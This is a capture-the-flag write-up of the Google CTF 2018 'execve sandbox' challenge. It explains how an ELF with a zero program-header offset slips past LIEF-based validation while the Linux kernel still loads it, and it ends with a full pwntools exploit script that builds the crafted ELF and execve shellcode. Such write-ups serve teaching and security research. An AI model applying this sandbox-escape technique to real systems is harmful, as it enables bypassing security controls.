# Writeup for execve sandbox (pwn, 283 pts, 23 solves), Google CTF Qualifier 2018, by LevitatingLion

## TL;DR

After trying half a dozen different ideas, I came up with the following working solution

- ELF parser used by the binary skips program header table if `e_phoff == 0`

- Linux kernel will still load the ELF

- Exploit this with an ELF containing:

  - `PT_LOAD` segment with `p_vaddr == 0x10000` to bypass `mmap()` restriction

  - Shellcode to set up arguments and call `execve()`

## Task Description

> What a kewl sandbox! Seccomp makes it impossible to execute ./flag
>
> $ nc execve-sandbox.ctfcompetition.com 1337
>
> [[Attachment]](https://storage.googleapis.com/gctf-2018-attachments/cc7bb5c6b99ab71a1732fb4c4b66ae58ed8dab8ef353959fafe433040237fddf)

We are supplied with the source code of the challenge binary, which reads an ELF file from standard input, parses it using the [LIEF project](https://github.com/lief-project/LIEF) and does a couple of checks on it:

- It has to be a 64-bit ELF

- No segments with a virtual address < `0x12000` are allowed

- No sections with a virtual address < `0x12000` are allowed

Afterwards it starts the ELF inside a seccomp sandbox with the following syscall rules:

- Allowed syscalls: `rt_sigreturn`, `rt_sigaction`, `rt_sigprocmask`, `sigreturn`, `exit_group`, `exit`, `brk`, `access`, `fstat`, `write`, `close`, `mprotect`, `arch_prctl`, `munmap`, `readlink`, `uname`

  - We don't really need any of those for the exploit, apart from `write` to send us the flag

- Restricted syscalls:

  - `mmap` is only allowed with addresses > `0x11000`

  - `execve` is only allowed if the filename is stored at `0x10000`

The `execve` restriction is the important one, as this prevents us from executing `./flag` without previously allocating the page starting at `0x10000`. So, how do we allocate this page without using the ELF segments or mapping it directly with `mmap`?

## Failed Attempts

While reading through the challenge code, I quickly had a few ideas on how to approach this challenge. However, all of those turned out to not work in the end. I think they are interesting nonetheless and can lead to new insights in the Linux kernel and specifics of `mmap`, so I will describe every path I took.

### Specify custom ELF linker (`PT_INTERP`)

Every dynamically linked ELF executable specifies a path to a dynamic linker in its `PT_INTERP` segment, usually this is `/lib64/ld-linux-x86-64.so.2` for 64-bit and `/lib/ld-linux.so.2` for 32-bit binaries. When such a binary is invoked, the Linux kernel parses the ELF, loads its segments and its dynamic linker (as specified by `PT_INTERP`) into memory, and transfers control to the linker.

My idea was to simply specify `./flag` as the ELF's dynamic linker, but as it turns out the kernel does not recursively load the linker's linker, so we cannot execute dynamically linked binaries this way; shared libraries are not loaded and relocations are not processed. I tried to use this technique on the remote server, but it didn't work, so I assume `./flag` is dynamically linked. By the way, this would also explain why syscalls like `fstat` and `arch_prctl` are allowed, because they are used by the dynamic linker during startup.

Reference: [Linux kernel source](https://github.com/torvalds/linux/blob/86a2bb5ad83161cc687671bdf188699e137ae226/fs/binfmt_elf.c#L751)

### Allocate a huge page (`MAP_HUGETLB`)

The address passed to `mmap` does not have to be page aligned (if not, it's aligned automatically), so we would already win if we could call `mmap(0x10000 + PAGE_SIZE - 1, ...)`. However, the seccomp filter prevents us from passing `0x10fff` as the first argument to `mmap`, and the page size is fixed at `0x1000`. Or is it?

Most modern CPUs support multiple page sizes, e.g. 4K (that's what you're used to) and 2M, some even 1G. Linux exposes this to userspace with the `MAP_HUGETLB` flag. So, if we map address `0x11000` with the `MAP_HUGETLB` flag, the kernel should align the address down to the next multiple of the huge page size, which will be below our target address of `0x10000`.

This fails too, as huge pages are disabled by default on many systems, as well as on the remote server.

Reference: [hugetlbpage support in the
Linux kernel](https://www.kernel.org/doc/Documentation/vm/hugetlbpage.txt)

### Create a second stack (`MAP_GROWSDOWN`)

There's another `mmap` flag that could save us: `MAP_GROWSDOWN`. This can be used to create a second stack from userspace; when a page fault happens in the page directly below this mapping and there is enough space for it to grow, it is automatically expanded downwards. If we allocate a `MAP_GROWSDOWN` page above our target page and then access the target page, it would automatically get mapped, and we win.

When I tried this, however, the kernel did not expand the `MAP_GROWSDOWN` mapping, but sent a `SIGSEGV` instead. After the CTF I learned that the `rsp` register has to point into the expanding mapping for the kernel to actually expand it. This idea would've worked, I just implemented it incorrectly.

Reference: [mmap manpage](http://man7.org/linux/man-pages/man2/mmap.2.html)

### Use `brk()` to allocate the target area

We are allowed to use the `brk` syscall, which is, similar to `mmap`, used for memory allocation (usually the heap is allocated with `brk`). Using `brk(0x10000)`, we might be able to move our 'program break' to the target address, and then allocate it using `brk(0x11000)`.

However, with `brk` we're only allowed to allocate a contiguous block of memory starting at a predetermined address, so we cannot use it to allocate our target page.

Reference: [brk manpage](http://man7.org/linux/man-pages/man2/brk.2.html)

### Allocate all of virtual memory

This idea seems kind of desperate: we just allocate all of virtual memory, and eventually we would have mapped our target area. If the kernel doesn't prevent us from allocating this much memory, we could actually succeed, because virtual memory mappings don't occupy physical memory, as long as they are not written to.

But as you probably expected, even with the virtual memory contents not occupying physical memory, we cannot simply allocate this much memory. On amd64, out of the 64 address bits only 48 bits are used (the remaining 16 are sign-extended) and the lower half of the address space is accessible from userspace, which leaves us with almost 128 TiB of virtual memory to allocate; that's just too much to allocate in a reasonable amount of time (also, I doubt the kernel allows a process to exhaust its virtual address space).

Reference: [x86-64: Virtual address space details](https://en.wikipedia.org/wiki/X86-64#Virtual_address_space_details)

### Crash the ELF parser and use the uploaded file

With this idea we are already heading in the right direction: abusing the ELF parser (part of the [LIEF project](https://github.com/lief-project/LIEF)) used by the binary.

If the file we upload is not an ELF binary, the parser throws an exception, which is not handled by the challenge's C code:

```
[*] waiting for an ELF binary...
not-an-elf-deadbeef
[*] received 19 bytes
terminate called after throwing an instance of 'LIEF::bad_format'
  what():  '/tmp/execve-sandbox-aNEpqZ' is not an ELF
Aborted (core dumped)
```

The final exception handler calls `terminate`, which immediately causes the process to dump core. This means that our uploaded file is not deleted, but remains on the filesystem. The error message even tells us its exact location! We could use this in combination with the `PT_INTERP` technique explained above to execute an unvalidated executable which is not an ELF (provided the remote server supports other executable formats as well, e.g. the long outdated a.out format).

As it turns out, we interact with a fresh container every time we connect to the service, so we have no chance of carrying over files from one connection to another.

## Working Solution: trick the ELF parser

After all the failed ideas we finally arrive at a working solution: we search for a difference in the parsers used by the challenge binary and the Linux kernel, which allows us to bypass the ELF validation. It makes sense that such a difference exists, because the two parsers are designed with different goals in mind: the LIEF parser tries to correctly parse the binary according to the standard, while the kernel tries to load and execute the binary even if it doesn't follow the standard strictly.

When we tamper with the ELF header for a while, we notice some interesting behaviour, which can be explained by looking at the source code of the parsers:

The LIEF parser [skips parsing](https://github.com/lief-project/LIEF/blob/e794ac1502ee7636755bd441923368f88525a7d0/src/ELF/Parser.tcc#L58) of the program header table (which specifies the ELF's segments) when `e_phoff` is zero:

```cpp
if (this->binary_->header_.program_headers_offset() > 0) {
    this->parse_segments<ELF_T>();
} else {
    LOG(WARNING) << "Binary doesn't have a program header";
}
```

While the Linux kernel happily [loads the binary](https://github.com/torvalds/linux/blob/86a2bb5ad83161cc687671bdf188699e137ae226/fs/binfmt_elf.c#L422):

```c
loff_t pos = elf_ex->e_phoff;
[...]
/* Read in the program headers */
retval = kernel_read(elf_file, elf_phdata, size, &pos);
```

Using this difference in the parsers, we can craft a custom ELF file, which has its program header table located at offset zero, to skip the ELF validation part, and directly map `0x10000` using a `PT_LOAD` segment. We include a small shellcode in our binary, which writes `./flag` to `0x10000` and executes `execve(0x10000, NULL, NULL)`, and finally retrieve the flag!

`CTF{Time_to_read_that_underrated_Large_Memory_Management_Vulnerabilities_paper}`

## Conclusion

Although it took me several different ideas and approaches to solve this challenge, I eventually succeeded, and learned a lot about Linux' ELF loader and memory management internals on the way!

I hope you enjoyed reading this writeup as much as I did writing it. Thanks to Google for organizing this great CTF!

## Exploit Script

Last but not least, the script I used to solve the challenge:

```python
#!/usr/bin/env python
# -*- coding: utf-8 -*-

from pwn import *

exe = './flag'
addr = 0x10000


def exploit():
    # build the handcrafted elf
    elf = build_elf()
    # send it to the server
    r = remote('execve-sandbox.ctfcompetition.com', 1337)
    r.recvuntil('ELF binary...\n')
    r.send(elf + 'deadbeef')
    # receive the flag
    r.interactive()


def build_elf():
    context.arch = 'amd64'
    shellcode = asm(
        # copy the filename to the target address
        shellcraft.strcpy(addr, addr + 0x38 * 4)
        # call execve(filename)
        + shellcraft.execve(addr, 0, 0)
    )

    # elf header

    # elf magic
    elf = '\x7fELF'
    # elf class: 64-bit
    elf += p8(2)
    # endianness: little endian
    elf += p8(1)
    # elf version, usually set to 1
    elf += p8(1)
    # abi: linux abi
    elf += p8(3)
    # unused
    elf += '\0' * 8
    # binary type: executable
    elf += p16(2)
    # target architecture: x86-64
    elf += p16(0x3e)
    # elf version, again 1
    elf += p32(1)
    # entry point: after the headers we place the executable name and after that the shellcode
    elf += p64(addr + 0x38 * 4 + len(exe) + 1)
    # offset of programm header table (0, so LIEF doesn't parse it)
    elf += p64(0)
    # offset of section header table
    elf += p64(0)
    # some flags - unused
    elf += p32(0)
    # size of elf header
    elf += p16(0x40)
    # size of program header table entry
    elf += p16(0x38)
    # number of entries in program header table:
    #   the first two entries will overlap with the elf header, so we could use 3 here.
    #   However, this field coincides with the type of the second segment and 3 means PT_INTERP,
    #       which is interpreted by the kernel
    #   Thus we use 4 (PT_NOTE), which is ignored by the kernel and add additional padding at the end
    elf += p16(4)
    # size of section header table entry
    elf += p16(0)
    # number of entries in section header table
    elf += p16(0)
    # index of section header table entry containing section names
    elf += p16(0)

    # padding to 4th program header table entry
    elf += '\0' * (0x30 + 0x38)

    # program header table entry: PT_LOAD segment
    #   we load the whole binary into memory at the target address 0x10000
    #   and use the shellcode to write the executable's path there at runtime

    # type: PT_LOAD
    elf += p32(1)
    # protection flags: rwx
    elf += p32(4 | 2 | 1)
    # offset in file
    elf += p64(0)
    # virtual address
    elf += p64(addr)
    # physical address
    elf += p64(addr)
    # size in file
    elf += p64(0x38 * 4 + len(exe) + 1 + len(shellcode))
    # size in memory
    elf += p64(0x38 * 4 + len(exe) + 1 + len(shellcode))
    # alignment
    elf += p64(0)

    # append executable name and shellcode
    elf += exe + '\0' + shellcode

    return elf


if __name__ == '__main__':
    exploit()

```
